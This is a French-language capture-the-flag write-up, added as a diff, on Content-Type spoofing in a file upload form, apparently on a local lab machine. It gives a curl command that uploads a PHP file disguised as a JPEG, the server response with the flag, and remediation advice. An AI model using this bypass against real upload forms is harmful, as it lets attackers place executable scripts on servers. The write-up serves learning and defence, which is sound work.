@@ -1,0 +1,37 @@
+📖 Définition
+
+Le **Content-Type Spoofing** se produit lorsqu'un attaquant manipule l'en-tête HTTP `Content-Type` pour décrire incorrectement les données envoyées au serveur. Dans les failles d'upload de fichiers, cela est utilisé pour tromper le serveur et lui faire accepter des types de fichiers interdits (comme des scripts PHP exécutables) en les déguisant en types sûrs (comme des images JPEG).
+
+📖 Approche
+
+Pour cette faille, j'ai trouvé un formulaire d'envoi d'images. J'ai tenté d'envoyer un fichier PHP, mais il a été refusé. J'ai compris que le serveur vérifiait probablement le type MIME envoyé par le navigateur. Comme il est difficile de modifier cela via l'interface standard pour un fichier `.php`, j'ai utilisé `curl`.
+
+J'ai construit une requête POST pour envoyer mon fichier PHP tout en spécifiant manuellement que son `Content-Type` était `image/jpeg`. Le serveur, faisant confiance à l'en-tête, a accepté le fichier.
+
+**Commande utilisée :**
+
+```bash
+curl -X POST -F "Upload=Upload" -F "uploaded=@test.php;type=image/jpeg" http://192.168.56.101/?page=upload
+```
+
+**Explication :**
+- `-X POST`: Méthode HTTP.
+- `-F "Upload=Upload"`: Simule le bouton d'envoi.
+- `-F "uploaded=@test.php;type=image/jpeg"`: Envoie le fichier `test.php` mais indique au serveur que c'est une image JPEG (`image/jpeg`).
+
+```html
+<pre><center><h2 style="margin-top:50px;">The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> </pre><pre>/tmp/test.php succesfully uploaded.</pre>
+```
+
+**Flag :** `46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8`
+
+🛡️ Remédiation
+
+Pour corriger cela :
+- **Vérifier les Magic Bytes** : Analyser le contenu réel du fichier (signature binaire) pour déterminer son type, et ne pas se fier à l'extension ou au Content-Type.
+- **Renommer les fichiers** : Stocker les fichiers avec un nom généré aléatoirement et une extension sûre.
+- **Stocker hors racine web** : Si possible, stocker les fichiers dans un dossier non accessible directement par le serveur web.
+
+🔗 Sources
+
+- [OWASP - Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
